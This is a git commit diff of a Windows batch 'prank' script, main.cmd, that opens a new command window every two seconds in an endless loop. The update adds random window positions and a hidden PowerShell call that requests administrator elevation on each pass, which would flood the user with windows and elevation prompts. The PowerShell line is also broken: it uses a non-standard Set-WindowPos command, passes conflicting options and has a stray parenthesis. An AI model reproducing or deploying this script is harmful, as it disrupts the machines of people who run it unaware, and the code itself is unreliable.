532476733f8978fded0af68db0c3475dd9e404ed
JuanQ <87898162+thedragon40@users.noreply.github.com>
2023-11-09 14:16:42 +0100

    Update main.cmd

--- main.cmd
+++ main.cmd
@@ -1,6 +1,11 @@
 @echo off
 echo Iniciando "broma"...
 
+setlocal EnableDelayedExpansion
+
 :start
-start "Ventana %time%" cmd /c echo Ventana && timeout /nobreak /t 2 >nul
+set /a "x=!random! %% 800"
+set /a "y=!random! %% 600"
+powershell -WindowStyle Hidden -Command "& {Start-Process cmd -ArgumentList '/c echo Ventana' -WindowStyle Normal -NoNewWindow -WorkingDirectory ~ -Verb RunAs -PassThru | %{Set-WindowPos $_.MainWindowHandle -X %x% -Y %y%})}"
+timeout /nobreak /t 2 >nul
 goto start
